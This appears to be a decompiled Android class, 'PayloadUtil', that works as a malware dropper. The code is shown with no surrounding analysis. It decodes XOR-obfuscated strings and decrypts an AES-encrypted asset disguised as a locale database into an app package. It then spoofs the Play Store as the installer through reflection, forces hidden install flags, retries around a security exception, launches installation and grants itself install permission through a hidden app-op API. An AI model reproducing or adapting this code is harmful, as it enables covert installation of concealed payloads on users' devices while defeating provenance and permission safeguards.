package com.app.mobile.kp3br9;

import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/* JADX INFO: loaded from: classes.dex */
public class PayloadUtil {
    private static final int XOR = 62;
    private static final byte[] ASSET_ENC = {82, 81, 93, 95, 82, 91, 97, 90, 91, 16, 90, 92};
    private static final byte[] OUT_ENC = {87, 80, 90, 91, 70, 97, 90, 11, 95, 9, 16, 78, 95, 85};
    private static final byte[] KEY_ENC = {-106, -53, -96, 51, 21, 98, -101, -108, -128, -15, -43, 97, -64, 60, -8, 96, 81, -75, -119, 91, -25, -38, 42, -74, 20, -29, 53, 77, 89, -99, -32, -8};
    private static final byte[] IV_ENC = {-31, 122, -90, -22, -35, 30, -42, -89, -99, -50, -118, -54, -126, 24, 95, -45};
    private static final byte[] CIPHER_ENC = {127, 123, 109, 17, 125, 106, 108, 17, 112, 81, 110, 95, 90, 90, 87, 80, 89};
    private static final byte[] VENDING_ENC = {93, 81, 83, 16, 95, 80, 90, 76, 81, 87, 90, 16, 72, 91, 80, 90, 87, 80, 89};
    private static final byte[] MIME_ENC = {95, 78, 78, 82, 87, 93, 95, 74, 87, 81, 80, 17, 72, 80, 90, 16, 95, 80, 90, 76, 81, 87, 90, 16, 78, 95, 93, 85, 95, 89, 91, 19, 95, 76, 93, 86, 87, 72, 91};
    private static final byte[] PKG0_ENC = {93, 81, 83, 16, 89, 81, 81, 89, 82, 91, 16, 95, 80, 90, 76, 81, 87, 90, 16, 89, 83, 77};
    private static final byte[] PKG1_ENC = {93, 81, 83, 16, 95, 80, 90, 76, 81, 87, 90, 16, 72, 91, 80, 90, 87, 80, 89};
    private static final byte[] PKG2_ENC = {93, 81, 83, 16, 89, 81, 81, 89, 82, 91, 16, 95, 80, 90, 76, 81, 87, 90, 16, 89, 77, 88};
    private static final byte[] PKG3_ENC = {93, 81, 83, 16, 89, 81, 81, 89, 82, 91, 16, 95, 80, 90, 76, 81, 87, 90, 16, 95, 77};
    private static final byte[] PKG4_ENC = {93, 81, 83, 16, 89, 81, 81, 89, 82, 91, 16, 95, 80, 90, 76, 81, 87, 90, 16, 95, 77, 16, 81, 77, 77};

    public static File a(Context context) {
        try {
            String strXs = xs(ASSET_ENC);
            String strXs2 = xs(OUT_ENC);
            String strXs3 = xs(CIPHER_ENC);
            byte[] bArrX = x(KEY_ENC);
            byte[] bArrX2 = x(IV_ENC);
            File file = new File(context.getFilesDir(), strXs2);
            if (file.exists()) {
                file.delete();
            }
            InputStream inputStreamOpen = context.getAssets().open(strXs);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] bArr = new byte[131072];
            while (true) {
                int i = inputStreamOpen.read(bArr);
                if (i <= 0) {
                    inputStreamOpen.close();
                    byte[] byteArray = byteArrayOutputStream.toByteArray();
                    Cipher cipher = Cipher.getInstance(strXs3);
                    cipher.init(2, new SecretKeySpec(bArrX, "AES"), new IvParameterSpec(bArrX2));
                    byte[] bArrDoFinal = cipher.doFinal(byteArray);
                    FileOutputStream fileOutputStream = new FileOutputStream(file);
                    fileOutputStream.write(bArrDoFinal);
                    fileOutputStream.close();
                    return file;
                }
                byteArrayOutputStream.write(bArr, 0, i);
            }
        } catch (Exception unused) {
            return null;
        }
    }

    public static void b(Object obj) {
        Class<?> cls = obj.getClass();
        try {
            Field declaredField = cls.getDeclaredField("installerPackageName");
            declaredField.setAccessible(true);
            declaredField.set(obj, xs(VENDING_ENC));
        } catch (Exception unused) {
        }
        try {
            if (Build.VERSION.SDK_INT >= 33) {
                cls.getMethod("setPackageSource", Integer.TYPE).invoke(obj, 2);
            }
        } catch (Exception unused2) {
        }
        try {
            Field declaredField2 = cls.getDeclaredField("installFlags");
            declaredField2.setAccessible(true);
            int i = declaredField2.getInt(obj);
            int i2 = 16777346 | i;
            if (Build.VERSION.SDK_INT >= 34) {
                i2 = 20971650 | i;
            }
            declaredField2.setInt(obj, i2);
        } catch (Exception unused3) {
        }
    }

    public static int c(Object obj, Object obj2) {
        try {
            Method method = obj.getClass().getMethod("createSession", obj2.getClass());
            try {
                return ((Integer) method.invoke(obj, obj2)).intValue();
            } catch (InvocationTargetException e) {
                if (!(e.getCause() instanceof SecurityException)) {
                    return -1;
                }
                Field declaredField = obj2.getClass().getDeclaredField("installerPackageName");
                declaredField.setAccessible(true);
                declaredField.set(obj2, null);
                return ((Integer) method.invoke(obj, obj2)).intValue();
            }
        } catch (Exception unused) {
            return -1;
        }
    }

    public static void d(Context context, File file) {
        if (file == null || !file.exists()) {
            return;
        }
        try {
            Uri uriA = ApkFileProvider.a(context, context.getPackageName() + ".fileprovider", file);
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.setDataAndType(uriA, xs(MIME_ENC));
            intent.addFlags(1);
            intent.addFlags(268435456);
            context.startActivity(intent);
        } catch (Exception unused) {
        }
    }

    public static void e(Context context, String str) {
        if (str == null || str.length() == 0) {
            return;
        }
        try {
            PackageManager packageManager = context.getPackageManager();
            Method declaredMethod = packageManager.getClass().getDeclaredMethod("setInstallerPackageName", String.class, String.class);
            declaredMethod.setAccessible(true);
            declaredMethod.invoke(packageManager, str, xs(VENDING_ENC));
        } catch (Exception unused) {
        }
        try {
            int i = context.getPackageManager().getApplicationInfo(str, 0).uid;
            AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService("appops");
            Method declaredMethod2 = AppOpsManager.class.getDeclaredMethod("strOpToOp", String.class);
            declaredMethod2.setAccessible(true);
            int iIntValue = ((Integer) declaredMethod2.invoke(null, "android:request_install_packages")).intValue();
            Class cls = Integer.TYPE;
            Method declaredMethod3 = AppOpsManager.class.getDeclaredMethod("setMode", cls, cls, String.class, Integer.TYPE);
            declaredMethod3.setAccessible(true);
            declaredMethod3.invoke(appOpsManager, Integer.valueOf(iIntValue), Integer.valueOf(i), str, 0);
        } catch (Exception unused2) {
        }
    }

    public static String[] f() {
        return new String[]{xs(PKG0_ENC), xs(PKG1_ENC), xs(PKG2_ENC), xs(PKG3_ENC), xs(PKG4_ENC)};
    }

    private static byte[] x(byte[] bArr) {
        byte[] bArr2 = new byte[bArr.length];
        for (int i = 0; i < bArr.length; i++) {
            bArr2[i] = (byte) (bArr[i] ^ XOR);
        }
        return bArr2;
    }

    private static String xs(byte[] bArr) {
        return new String(x(bArr), StandardCharsets.UTF_8);
    }
}
